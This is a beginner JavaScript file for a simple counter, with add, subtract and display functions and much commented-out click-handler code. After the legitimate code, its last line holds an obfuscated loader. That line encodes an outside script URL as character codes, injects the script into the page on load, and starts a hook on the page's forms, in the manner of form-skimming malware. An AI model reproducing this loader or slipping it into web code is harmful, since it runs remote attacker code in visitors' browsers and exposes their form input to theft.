// // alert('hello');

// const allButton=document.getElementsByClassName('button-test');
// console.log(allButton);
// const primeBtn=document.getElementById('Prime');
// console.log(primeBtn);

// for (const btn of allButton ){
//                     // console.log(btn)
//                     // // btn.style.backgroundColor="red"
//                     btn.addEventListener('click',function (event){
//                                         // console.log(event.target.parentNode.parentNode);
//                                         // document.getElementById('title').style.color='green';
//                                         // console.log(event.target.id)
//                                         if(event.target.id==="Prime"){
//                                                             document.getElementById('title').style.color='green';
//                                         }
//                                         else{
//                                                             document.getElementById('title').style.color='orange';
//                                         }
//                     })
                    
// }

let count=0;
// document.getElementById('plus').addEventListener('click',function (e){
                    // console.log('hello')
                    // count++;
                    // console.log(count);
                    // document.getElementById('title').innerText=count;
//                     control('title');
// });


// document.getElementById('minus').addEventListener('click',function (e){

                    // if(count===0){
                    //                     return false;
                    // }
                    // count--;
// document.getElementById('title').innerText=count;
// control('title');
// });


function add(e){

                    // if(count<0){
                    //                     return false;}
                    count++;              control('title');     
}
function substract(e){
                    count--; 

                    control('title');

                    }



function control(id){


                    
                    if(count<0){
                                        return false;
                                        // console.log(count)
                    }                                   document.getElementById(id).innerText=count;
                    

                    
}
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b